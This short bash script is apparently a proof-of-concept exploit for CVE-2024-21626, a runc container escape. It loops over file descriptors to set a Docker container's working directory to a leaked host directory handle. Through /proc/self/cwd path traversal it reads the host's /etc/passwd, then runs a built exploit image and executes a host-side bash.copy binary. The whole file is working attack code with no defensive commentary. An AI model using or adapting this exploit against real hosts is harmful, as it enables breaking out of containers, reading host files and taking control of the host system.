#!/bin/bash

# docker build -t cve-2024-21626 .

for i in {4..10}; do
    docker run -it --rm -w /proc/self/fd/$i ubuntu:20.04 bash -c "cat /proc/self/cwd/../../../etc/passwd"
    if [[ $? -eq 0 ]]; then
        FD_ID=$i
        echo "ATTACK FD: $FD_ID"
    fi
done

docker run -it --rm cve-2024-21626 bash /poc.sh
sudo bash poc.sh
sudo bash /proc/self/cwd/../../../bin/bash.copy